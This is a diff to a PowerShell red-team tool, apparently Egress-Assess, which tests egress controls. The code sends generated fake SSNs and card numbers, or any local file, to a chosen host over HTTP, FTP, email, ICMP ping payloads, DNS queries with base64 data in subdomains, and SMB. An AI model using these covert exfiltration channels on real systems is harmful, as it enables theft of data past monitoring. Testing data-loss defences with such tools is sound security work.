@@ -277,11 +277,23 @@ function Invoke-EgressAssess
                     $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
                     $wc.proxy = $proxy
                 }
-                Write-Verbose  "Uploading  data..."
-                $wc.UploadString($uri, $Data)
-                $totalupload += $sizedata
-                Write-Verbose "Transaction Complete!"
-                Return
+                Do {
+                    Try {
+                    Write-Verbose  "Uploading  data..."
+                    $wc.UploadString($uri, $Data)
+                    $totalupload += $sizedata
+                    }
+                    catch
+                    {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose "[*] Error, tranfer failed with error:"
+                    Write-Verbose $ErrorMessage
+                    Break
+                    }
+                    Write-Verbose "[*] Transfer complete!"
+                    $loops--
+                    Write-Verbose "[*] $loops loops remaining.."
+                    } While ($loops -gt 0)
             }
             elseif ($Datatype -notcontains "ssn" -or "cc" -or "names")
             {
@@ -335,39 +347,77 @@ function Invoke-EgressAssess
             {
                 if ($Datatype -eq "ssn") {
                     Generate-SSN
-                    $Data = $AllSSN
+                    $FTPData = $AllSSN
                 }
                 elseif ($Datatype -eq "cc") {
                     Generate-CreditCards
-                    $Data = $AllCC
+                    $FTPData = $AllCC
                 }
                 elseif ($Datatype -eq "names") {
                     Generate-Names
-                    $Data = $AllNames
+                    $FTPData = $AllNames
                 }
             
             elseif ($Datatype -notcontains "ssn" -or "cc" -or "names") {
                 if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
                 $Path = get-childitem $Datatype | % { $_.Name }
+                $filetransfer = $True
                 }
             }
-            else {
-                $Date = Get-Date -Format Mdyyyy_hhmmss
-                $Path = "ftpdata" + $Date + ".txt"
-            }       
-            $Destination = "ftp://" + $IP + "/" + $Path
-            $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
-            $webclient = New-Object System.Net.WebClient
-            $webclient.Credentials = New-Object System.Net.NetworkCredential($username,$password)
-            if ($proxy)
-            {
-                $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-                $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
-                $webclient.proxy = $proxy
+            if ($filetransfer -eq $True) {
+                $Destination = "ftp://" + $IP + "/" + $Path
+                $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
+                $webclient = New-Object System.Net.WebClient
+                $webclient.Credentials = New-Object System.Net.NetworkCredential($username,$password)
+                if ($proxy)
+                {
+                    $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+                    $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
+                    $webclient.proxy = $proxy
+                }
+                $uri = New-Object System.Uri($Destination)
+                $webclient.UploadFile($uri, $SourceFilePath)
+                Write-Verbose "[*] File Transfer Complete."
             }
-            $uri = New-Object System.Uri($Destination)
-            $webclient.UploadFile($uri, $SourceFilePath)
-            Write-Verbose "[*] File Transfer Complete."
+            else {
+                Do {
+                    Try {
+                    $Date = Get-Date -Format Mdyyyy_hhmmss
+                    $Path = "ftpdata" + $Date + ".txt"
+                    $Destination = "ftp://" + $IP + "/" + $Path
+                    $Credential = New-Object -TypeName System.Net.NetworkCredential -ArgumentList $Username, $Password
+                    
+                    # Create the FTP request and upload the file
+                    $FtpRequest = [System.Net.FtpWebRequest][System.Net.WebRequest]::Create($Destination)
+                    if ($proxy)
+                    {
+                        $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+                        $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
+                        $FtpRequest.proxy = $proxy
+                    }
+                    $FtpRequest.KeepAlive = $False
+                    $FtpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+                    $FtpRequest.Credentials = $Credential
+                    # Get the request stream, and write the file bytes to the stream
+                    $Encoder = [system.Text.Encoding]::UTF8
+                    $RequestStream = $FtpRequest.GetRequestStream()
+                    $Encoder.GetBytes($FTPData) | % { $RequestStream.WriteByte($_); }
+                    $RequestStream.Close()
+                    Write-Verbose "[*] File Transfer Complete."
+                    }
+                    catch
+                    {
+                        $ErrorMessage = $_.Exception.Message
+                        Write-Verbose "[*] Error, tranfer failed with error:"
+                        Write-Verbose $ErrorMessage
+                        Break
+                    }
+                    Write-Verbose "[*] Transfer complete!"
+                    $loops--
+                    Write-Verbose "[*] $loops loops remaining.."
+                    } While ($loops -gt 0)
+            }       
+            
         }
         
         function Use-SFTP
@@ -383,15 +433,15 @@ function Invoke-EgressAssess
             {
                 if ($Datatype -eq "ssn") {
                     Generate-SSN
-                    $Data = $AllSSN
+                    $FTPData = $AllSSN
                 }
                 elseif ($Datatype -eq "cc") {
                     Generate-CreditCards
-                    $Data = $AllCC
+                    $FTPData = $AllCC
                 }
                 elseif ($Datatype -eq "names") {
                     Generate-Names
-                    $Data = $AllNames
+                    $FTPData = $AllNames
                 }
             
             elseif ($Datatype -notcontains "ssn" -or "cc" -or "names") {
@@ -506,6 +556,7 @@ function Invoke-EgressAssess
             
             elseif ($Datatype -notcontains "ssn" -or "cc" -or "names") {
                 if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
+                $filetransfer = $True
                 $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
             }
             }
@@ -513,8 +564,26 @@ function Invoke-EgressAssess
             {
                 Write-Verbose "[*] You did not provide a data type to generate."
             }
-            Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "$SMTPData" -Attachments "$SourceFilePath" -SmtpServer $IP
-            Write-Verbose "[*] Email sent!"
+            Do {
+            Try { 
+                if ($filetransfer -eq $true) {
+                Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "EgressAssess With Attachment" -Attachments "$SourceFilePath" -SmtpServer $IP
+                }
+                else {
+                Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "$SMTPData" -SmtpServer $IP    
+                }
+            }
+            catch
+            {
+                $ErrorMessage = $_.Exception.Message
+                Write-Verbose "[*] Error, tranfer failed with error:"
+                Write-Verbose $ErrorMessage
+                Break
+            }
+            Write-Verbose "[*] Transfer complete!"
+            $loops--
+            Write-Verbose "[*] $loops loops remaining.."
+            } While ($loops -gt 0)
         }
         
         function Use-ICMP
@@ -523,15 +592,15 @@ function Invoke-EgressAssess
             {
                 if ($Datatype -eq "ssn") {
                     Generate-SSN
-                    $ICMPData = $AllSSN
+                    [string]$ICMPData = $AllSSN
                 }
                 elseif ($Datatype -eq "cc") {
                     Generate-CreditCards
-                    $ICMPData = $AllCC
+                    [string]$ICMPData = $AllCC
                 }
                 elseif ($Datatype -eq "names") {
                     Generate-Names
-                    $ICMPData = $AllNames
+                    [string]$ICMPData = $AllNames
                 }
             
             elseif ($Datatype -notcontains "ssn" -or "cc" -or "names") {
@@ -563,8 +632,7 @@ function Invoke-EgressAssess
             $PacketNumber = 1
             $bufferSize = 1050
             $Timeout = 1000
-            
-            
+
             if ($FileTransfer -eq $True)
             {
                 $Delimiter = '.:::-989-:::.'
@@ -596,23 +664,37 @@ function Invoke-EgressAssess
             }
             else
             {
-                Write-Verbose "[*] Sending data via ICMP."
-                $TotalPackets = [int]($ICMPData.length/$bufferSize)
-                While ($ByteReader -le ($ICMPData.length - $bufferSize))
-                {
-                    Write-Verbose "[*] Sending $PacketNumber of $TotalPackets packets"
-                    $DataToSend = $ICMPData.Substring($ByteReader, $bufferSize)
-                    $Encoder = [system.Text.Encoding]::UTF8
-                    $DataBytes = $Encoder.GetBytes($DataToSend)
-                    $EncodedData = [System.Convert]::ToBase64String($DataBytes)
-                    $Buffer = $Encoder.GetBytes($EncodedData)
-                    $Ping = New-Object -TypeName System.Net.NetworkInformation.Ping
-                    $PingReply = $Ping.Send($FinalDestination, $Timeout, $Buffer)
-                    $ByteReader += $bufferSize
-                    $PacketNumber++
-                }
-                # TODO: Add transfer status
-                Write-Verbose "[*] ICMP transfers complete!"
+                Do {
+                    try {
+                        Write-Verbose "[*] Sending data via ICMP."
+                        [int]$TotalPackets = ($ICMPData.length/$bufferSize)
+                        While ($ByteReader -le ($ICMPData.length - $bufferSize))
+                        {
+                        Write-Verbose "[*] Sending $PacketNumber of $TotalPackets packets"
+                        $DataToSend = $ICMPData.Substring($ByteReader, $bufferSize)
+                        $Encoder = [system.Text.Encoding]::UTF8
+                        $DataBytes = $Encoder.GetBytes($DataToSend)
+                        $EncodedData = [System.Convert]::ToBase64String($DataBytes)
+                        $Buffer = $Encoder.GetBytes($EncodedData)
+                        $Ping = New-Object -TypeName System.Net.NetworkInformation.Ping
+                        $PingReply = $Ping.Send($FinalDestination, $Timeout, $Buffer)
+                        $ByteReader += $bufferSize
+                        $PacketNumber++
+                        }
+                    }
+                    catch
+                    {
+                        $ErrorMessage = $_.Exception.Message
+                        Write-Verbose "[*] Error, tranfer failed with error:"
+                        Write-Verbose $ErrorMessage
+                        Break
+                    }
+                    Write-Verbose "[*] Transfer complete!"
+                    $ByteReader = 0
+                    $PacketNumber = 0
+                    $loops--
+                    Write-Verbose "[*] $loops loops remaining.."
+                    } While ($Loops -gt 0) 
             }
         }
         
@@ -640,47 +722,57 @@ function Invoke-EgressAssess
                 break
                 }
             }
-            
-            [int]$MaxLenth = 63
-            [int]$DefaultLength = 35
-            [int]$ByteReader = 0
-            $bufferSize = 35
-            $PacketNumber = 1
-            
-            if ($DNSData.length % $DefaultLength -eq 0)
-            {
-                [int]$TotalPackets = $($DNSData.length) / $DefaultLength
-            }
-            Else
-            {
-                
-                [int]$TotalPackets = $($DNSData.length) / $DefaultLength
-                $TotalPackets += 1
-            }
-            $CurrentTotal = $TotalPackets
-            While ($ByteReader -lt $($DNSData.length))
-            {
-                try
-                {
+            Do {
+                try {
+                    [int]$MaxLenth = 63
+                    [int]$DefaultLength = 35
+                    [int]$ByteReader = 0
+                    $bufferSize = 35
+                    $PacketNumber = 1
                     
-                    $DataToSend = $DNSData.Substring($ByteReader, $DefaultLength)
-                    $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($DataToSend)
-                    $EncodedData = [System.Convert]::ToBase64String($DataBytes)
-                    Invoke-Expression "nslookup.exe -type=txt -norecurse -retry=1 -timeout=1 $EncodedData.$IP $IP 2>&1" | Out-Null
-                    Write-Verbose "[*] Sending data .... $PacketNumber/$TotalPackets"
-                    $PacketNumber += 1
-                    $ByteReader += $DefaultLength
+                    if ($DNSData.length % $DefaultLength -eq 0)
+                    {
+                        [int]$TotalPackets = $($DNSData.length) / $DefaultLength
+                    }
+                    Else
+                    {
+                        [int]$TotalPackets = $($DNSData.length) / $DefaultLength
+                        $TotalPackets += 1
+                    }
+                    $CurrentTotal = $TotalPackets
+                    While ($ByteReader -lt $($DNSData.length))
+                    {
+                        try
+                        {
+                            
+                            $DataToSend = $DNSData.Substring($ByteReader, $DefaultLength)
+                            $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($DataToSend)
+                            $EncodedData = [System.Convert]::ToBase64String($DataBytes)
+                            Invoke-Expression "nslookup.exe -type=txt -norecurse -retry=1 -timeout=1 $EncodedData.$IP $IP 2>&1" | Out-Null
+                            Write-Verbose "[*] Sending data .... $PacketNumber/$TotalPackets"
+                            $PacketNumber += 1
+                            $ByteReader += $DefaultLength
+                        }
+                        catch
+                        {
+                        $ErrorMessage = $_.Exception.Message
+                        Write-Verbose "[*] Error, DNS data tranfer failed with error:"
+                        Write-Verbose $ErrorMessage
+                        Break
+                        }
+                    }
                 }
                 catch
                 {
                     $ErrorMessage = $_.Exception.Message
-                    Write-Verbose "[*] Error, DNS data tranfer failed with error:"
+                    Write-Verbose "[*] Error, tranfer failed with error:"
                     Write-Verbose $ErrorMessage
                     Break
                 }
-            }
-            Write-Verbose "[*] DNS transfers complete!"
-            
+            Write-Verbose "[*] Transfer complete!"
+            $loops--
+            Write-Verbose "[*] $loops loops remaining.."
+            } While ($loops -gt 0)            
         }
         
         function Use-DNSResolved
@@ -710,18 +802,31 @@ function Invoke-EgressAssess
             {
                 Write-Verbose "[*] You did not provide a data type to generate."
             }
-            Write-Verbose "Sending data via DNS..this may take awhile."
-            $ByteReader = 0
-            While ($ByteReader -le ($DNSData.length - 20))
-            {
-                $DataToSend = $DNSData.Substring($ByteReader, 20)
-                $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($DataToSend)
-                $EncodedData = [System.Convert]::ToBase64String($DataBytes)
-                [string]$EncodedData -replace "=", ".---"
-                Invoke-Expression "nslookup.exe -querytype=A $EncodedData.$IP 2>&1" | Out-Null
-                $ByteReader += 20
-            }
-            Write-Verbose "[*] DNS transfers complete!"
+            Do {
+                try  {
+                    Write-Verbose "Sending data via DNS..this may take awhile."
+                    $ByteReader = 0
+                    While ($ByteReader -le ($DNSData.length - 20))
+                    {
+                        $DataToSend = $DNSData.Substring($ByteReader, 20)
+                        $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($DataToSend)
+                        $EncodedData = [System.Convert]::ToBase64String($DataBytes)
+                        [string]$EncodedData -replace "=", ".---"
+                        Invoke-Expression "nslookup.exe -querytype=A $EncodedData.$IP 2>&1" | Out-Null
+                        $ByteReader += 20
+                    }
+                }
+                catch
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose "[*] Error, tranfer failed with error:"
+                    Write-Verbose $ErrorMessage
+                    Break
+                }
+            Write-Verbose "[*] Transfer complete!"
+            $loops--
+            Write-Verbose "[*] $loops loops remaining.."
+            } While ($loops -gt 0) 
         }
         
         function Use-SMB
@@ -760,38 +865,42 @@ function Invoke-EgressAssess
                 
             }
             # If we're sending faux data, generate the file, send and delete it.
-            try
-            {
-                $Date = Get-Date -Format Mdyyyy_hhmmss
-                $Path = "smbdata_" + $Date + ".txt"
-                $SMBData | Out-File "$env:temp\$Path"
-                Copy-Item -Path $env:temp\$Path -Destination \\$IP\data
-                
+            Do {
                 try
-                {
-                    Remove-Item -Path $env:temp\$Path
-                }
+                    {
+                        $Date = Get-Date -Format Mdyyyy_hhmmss
+                        $Path = "smbdata_" + $Date + ".txt"
+                        $SMBData | Out-File "$env:temp\$Path"
+                        Copy-Item -Path $env:temp\$Path -Destination \\$IP\data
+                        
+                        try
+                        {
+                            Remove-Item -Path $env:temp\$Path
+                        }
+                        catch
+                        {
+                            $ErrorMessage = $_.Exception.Message
+                            Write-Verbose "[*] Error, unable to remove temporary file."
+                            Write-Verbose $ErrorMessage
+                            Break
+                        }
+                    }
                 catch
                 {
                     $ErrorMessage = $_.Exception.Message
-                    Write-Verbose "[*] Error, unable to remove temporary file."
+                    Write-Verbose "[*] Error, tranfer failed with error:"
                     Write-Verbose $ErrorMessage
                     Break
                 }
-            }
-            catch
-            {
-                $ErrorMessage = $_.Exception.Message
-                Write-Verbose "[*] Error, file tranfer failed with error:"
-                Write-Verbose $ErrorMessage
-                Break
-            }
-             Write-Verbose "[*] File transfer complete!"
+            Write-Verbose "[*] Transfer complete!"
+            $loops--
+            Write-Verbose "[*] $loops loops remaining.."
+            } While ($loops -gt 0)
         }
     }
     process
     {
-        while ($loops -gt 0) {
+      
         
             if ($client -eq "http" -or $client -eq "https")
             {
@@ -830,8 +939,6 @@ function Invoke-EgressAssess
                 Write-Verbose "[*] You failed to provide a protocol"
                 Return
             }
-        $loops -= 1
-        }
     }
     end
     {
